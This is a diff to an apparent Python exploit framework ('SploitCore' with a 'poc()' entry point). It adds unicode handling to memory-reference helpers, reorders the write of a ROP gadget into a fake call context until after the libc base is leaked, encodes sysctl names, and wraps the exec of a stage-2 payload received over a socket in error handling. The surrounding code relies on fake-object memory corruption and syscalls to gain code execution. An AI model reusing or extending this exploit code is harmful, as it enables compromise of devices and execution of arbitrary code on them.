@@ -1,6 +1,7 @@
 import struct
 import os
 from types import CodeType, FunctionType
+import traceback
 
 """
 What it does:
@@ -269,6 +270,9 @@ def get_ref_addr(obj):
         return refbytearray(obj)
     elif isinstance(obj, str):
         return refbytes(obj)
+    elif isinstance(obj, unicode):
+        utf8data = obj.encode("utf-8") + b"\0"
+        return refbytes(utf8data)
     else:
         raise Exception("Unsupported object type for get_ref_addr")
 
@@ -477,7 +481,7 @@ def getmem():
 def convert_regs_to_int(*regs):
     int_regs = []
     for r in regs:
-        if isinstance(r, (bytearray, str)):
+        if isinstance(r, (bytearray, str, unicode)):
             int_regs.append(get_ref_addr(r))
         else:
             int_regs.append(r)
@@ -667,10 +671,6 @@ class SploitCore(object):
         # (also need to set it here otherwise the gc will explode when it looks at my_func_ptr)
         self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)
 
-        self.call_contextbuf[0x130:0x138] = p64a(
-            self.libc_addr + self.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
-        )
-
         self.my_func_ptr = refbytearray(self.call_contextbuf)
         # print("my_func_ptr", hex(my_func_ptr))
         self.call_func = fakeobj(self.my_func_ptr)
@@ -684,6 +684,10 @@ class SploitCore(object):
             - SELECTED_LIBC["strcmp"]
         )
         print("[*] libc base address: 0x%x" % self.libc_addr)
+
+        self.call_contextbuf[0x130:0x138] = p64a(
+            self.libc_addr + self.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
+        )
 
         gettimeofday_in_libkernel = readuint(
             self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
@@ -1007,7 +1011,7 @@ class SploitCore(object):
                 return ip
 
     def sysctl(self, name, oldp=0, oldlenp=0, newp=0, newlenp=0):
-        name_bytes = name + b"\0"
+        name_bytes = name.encode("utf-8") + b"\0"
         nogc.append(name_bytes)
         translate_name_mib = alloc(8)
         buf_size = 0x70
@@ -1250,7 +1254,11 @@ def poc():
 
         # Execute stage 2, mimic file-exec by throwing local/global in same scope
         scope = dict(locals(), **globals())
-        exec(stage2_str, scope, scope)
+        try:
+            exec(stage2_str, scope, scope)
+        except Exception as e:
+            exc_msg = traceback.format_exc()
+            print_exc(exc_msg)  # this exists in globals()
 
     sc.run_function(SYSCALL["close"], s, syscall=True)  # close listening socket
 
